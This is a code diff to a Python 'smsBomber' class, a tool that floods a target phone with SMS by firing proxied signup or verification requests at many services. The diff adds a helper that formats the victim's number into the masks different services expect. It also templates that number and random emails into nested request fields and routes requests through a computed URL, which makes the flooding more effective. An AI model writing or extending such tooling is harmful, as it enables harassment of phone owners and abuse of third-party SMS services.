@@ -29,6 +29,19 @@ class smsBomber:
             tmp_email = random.choice(list('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890')) + tmp_email
         return tmp_email
 
+    def format(self, phone: str, mask: str, mask_symbol: str = "*"):
+        if len(phone) == mask.count(mask_symbol):
+            formatted_phone = ""
+            for symbol in mask:
+                if symbol == mask_symbol:
+                    formatted_phone += phone[0]
+                    phone = phone[(len(phone) - 1) * -1:]
+                else:
+                    formatted_phone += symbol
+        else:
+            formatted_phone = phone
+        return formatted_phone
+
     def _data(self):
         tmp_data = {}
         kk = 'params'
@@ -36,7 +49,16 @@ class smsBomber:
             kk = 'json'
         for key, value in self.serv[kk].items():
             if isinstance(value, str):
-                tmp_data[key] = value.format(cc=self.cc, target=self.number, ccc='8', email=self.email, semail=self.email.split('@')[0])
+                tmp_data[key] = value.format(cc=self.cc, target=self.number, ccc='8', email=self.email, semail=self.email.split('@')[0], formated=self.format('' + str(self.cc) + str(self.number), "+* (***) ***-**-**"), cformated=self.format('' + str(self.number), "(***) ***-**-**"), ccformated=self.format('' + str(self.cc) + str(self.number),
+                                                                      "* *** ***-**-**"))
+            elif isinstance(value, dict):
+                for k, v in self.serv[kk][key].items():
+                    tmp_data[kk][k] = v.format(cc=self.cc, target=self.number, ccc='8', email=self.email,
+                                                 semail=self.email.split('@')[0],
+                                                 formated=self.format('' + str(self.cc) + str(self.number),
+                                                                      "+* (***) ***-**-**"),
+                                                 cformated=self.format('' + str(self.number), "(***) ***-**-**"), ccformated=self.format('' + str(self.cc) + str(self.number),
+                                                                      "* *** ***-**-**"))
         return tmp_data
 
     def _url(self):
@@ -49,11 +71,12 @@ class smsBomber:
         params = self._data()
         headers = self._headers()
         proxy = self.proxy
+        url = self._url()
 
         try:
 
             if method == 'GET':
-                r = requests.get(self.serv['url'],
+                r = requests.get(url,
                                  params=params,
                                  headers=headers,
                                  timeout=30,
@@ -62,14 +85,14 @@ class smsBomber:
 
             elif method == 'POST':
                 if 'json' in self.serv:
-                    r = requests.post(self.serv['url'],
+                    r = requests.post(url,
                                       json=params,
                                       headers=headers,
                                       timeout=10,
                                       proxies=proxy,
                                       verify=True)
                 elif 'params' in self.serv:
-                    r = requests.post(self.serv['url'],
+                    r = requests.post(url,
                                       data=params,
                                       headers=headers,
                                       timeout=10,
